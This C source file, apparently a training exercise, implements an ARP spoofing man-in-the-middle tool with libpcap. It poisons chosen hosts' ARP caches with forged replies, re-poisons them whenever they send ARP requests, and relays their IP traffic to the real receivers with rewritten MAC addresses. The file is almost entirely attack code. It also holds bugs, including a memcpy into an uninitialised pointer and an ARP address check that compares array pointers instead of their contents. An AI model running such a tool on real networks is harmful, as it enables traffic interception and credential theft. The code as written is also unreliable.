/*
	1. send arp request to sender and receiver
	2. send arp reply to make sender spoofed
	3. whenever sender try to update arp table, make sender spoofed by arp reply
	3-1. if arp target ip is same to receiver's ip
	4. if sender send ip packet to receiver, 
		change ethernet address and send relay packet to receiver
*/


#include "arp_spoof.h"

int main(int argc, char *argv[]){
	int i=0, j=0;

	if (argc<4){
		usage();
		return -1;
	}
	
	u_int8_t my_mac[6];
	u_int8_t my_ip[4];
	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	struct objective_list *list;
	
	/* know my mac address and ip address */
	dev = argv[1];
	get_my_dev(my_mac, my_ip, dev);
	
	/* make a list for arp spoofing */
	int pair = (argc-2)/2;
	list = (struct objective_list*)malloc(pair * sizeof(struct objective_list));

	for(i=0; i<pair; i++){
		inet_aton(argv[2*i+2], (in_addr *)list[j].sender_ip);
		inet_aton(argv[2*i+3], (in_addr *)list[j].receiver_ip);
		
		j++;
	}
	
	pcap_t*	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	
	/* for getting info about mac addr of sender and receiver */
	for(i=0; i<pair; i++){
		send_arp_req(handle, list[i].sender_ip, &list[i], my_mac, my_ip, 1);
		send_arp_req(handle, list[i].receiver_ip, &list[i], my_mac, my_ip, 2);
	}
	
	/* make sender spoofed by fake arp reply */
	for(i=0; i<pair; i++){
		send_arp_rep(handle, list[i].sender_ip, &list[i], my_mac);
	}
	
	/* receive packets */
	struct ethernet_header *ether_hdr;
	struct ip *ip_hdr;
	struct arp_header *arp_hdr;

	while(1){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0 || res == -1 || res == -2)
			continue;
		
		ether_hdr = (struct ethernet_header *)packet;
		
		/* divided by every session */
		for (i=0; i<pair; i++){
			if (ntohs(ether_hdr->ether_type) == ETHERTYPE_ARP){
				arp_hdr = (arp_header*)(packet + sizeof(ethernet_header));
				
				/* check if the arp is arp request from sender to receiver */		
				if (arp_hdr->arp_tpa == list[i].receiver_ip){
					send_arp_rep(handle, list[i].sender_ip, &list[i], my_mac);
				}
			}
	
			else if (ntohs(ether_hdr->ether_type) == ETHERTYPE_IP){
				ip_hdr = (ip*)(packet + sizeof(ethernet_header));
				
				//  check if it is an ip packet to receiver
				if ((ip_hdr->ip_dst.s_addr) != *(u_int32_t *)(my_ip)) {
					u_int8_t *relay;
					memcpy(relay, packet, header->caplen);
					ether_hdr = (struct ethernet_header *)relay;
					
					/* fake mac information */
					memcpy(ether_hdr->ether_dhost,list[i].receiver_mac,6);
					memcpy(ether_hdr->ether_shost,my_mac,6);
						
					pcap_sendpacket(handle, relay, header->caplen);  // send relay packet
				}
			}
		}	
	}

	free(list);

	return 0;
}

